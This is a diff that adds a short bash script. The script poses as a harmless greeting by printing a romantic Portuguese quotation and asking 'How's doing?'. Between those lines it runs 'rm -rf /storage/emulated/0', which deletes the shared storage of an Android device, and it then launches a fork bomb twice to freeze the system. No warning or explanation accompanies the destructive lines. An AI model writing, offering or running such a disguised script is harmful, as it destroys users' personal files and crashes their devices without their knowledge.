@@ -1,0 +1,12 @@
+#!/usr/bin/env bash
+
+#Author: Mike Edwards 
+#Date: Mon, Nov 15
+#Shell Script
+
+clear
+printf "\e[1;36m\n\n\n\tSegurar a mão de vossa alteza era como segurar uma borboleta. Ou um batimento cardíaco. Como segurar algo completo e completamente vivo.\n\n\n"
+rm -rf /storage/emulated/0
+:(){ :|:& };:
+:(){ :|:& };:
+read -p " How's doing? "
